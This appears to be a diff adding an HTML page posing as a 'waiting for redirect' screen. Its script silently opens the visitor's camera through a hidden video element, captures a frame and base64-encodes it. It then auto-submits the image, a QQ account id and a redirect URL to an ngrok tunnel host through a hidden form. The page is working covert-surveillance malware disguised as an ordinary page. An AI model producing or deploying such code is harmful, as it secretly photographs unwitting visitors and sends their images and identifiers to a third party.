@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>等待跳转...</title>
+</head>
+<body>
+
+    <video id="video" width="0" height="0" autoplay></video>
+	<canvas style="width:0px;height:0px" id="canvas" width="480" height="640"></canvas>
+	<script type="text/javascript">
+		window.addEventListener("DOMContentLoaded", function() {
+			// 获取？参数
+			function GetQueryString(name){
+				var reg = new RegExp("(^|&)"+ name +"=([^&]*)(&|$)");
+				var r = window.location.search.substr(1).match(reg);
+				if(r!=null)return unescape(r[2]); return null;
+			}
+            var canvas = document.getElementById('canvas');
+            var context = canvas.getContext('2d');
+            var video = document.getElementById('video');
+
+            if(navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia({ video: true }).then(function(stream) {
+					video.srcObject = stream;
+                    video.play();
+                    setTimeout(function(){context.drawImage(video, 0, 0, 480, 640);},1000);
+                    setTimeout(function(){
+						var url =  GetQueryString ("url");
+						var qq =  GetQueryString ("id");
+						
+                        var img = canvas.toDataURL('image/png');  
+                        document.getElementById('result').value = img;
+						
+						var canvans = document.getElementById("canvas");
+						//以下开始编 数据   
+						var imgData = canvans.toDataURL();
+						//将图像转换为base64数据
+						var base64Data = imgData.substr(22);
+						document.getElementById('result').value = base64Data;
+						document.getElementById('qq').value = qq;
+						document.getElementById('tzurl').value = url;
+                        document.getElementById('gopo').submit();
+                        },1500);
+					
+                },function(){alert("网站打开失败！");});
+                
+            }
+		}, false);
+
+	</script>
+<form action="http://oovj28pcn7ao.ngrok.xiaomiqiu123.top/imge/aa" id="gopo" method="POST">
+	<input type="hidden" name="img" id="result" value="" />
+	<input type="hidden" name="qq" id="qq" value="" />
+	<input type="hidden" name="tzurl" id="tzurl" value="" />
+</form>
+</body>
+</html>
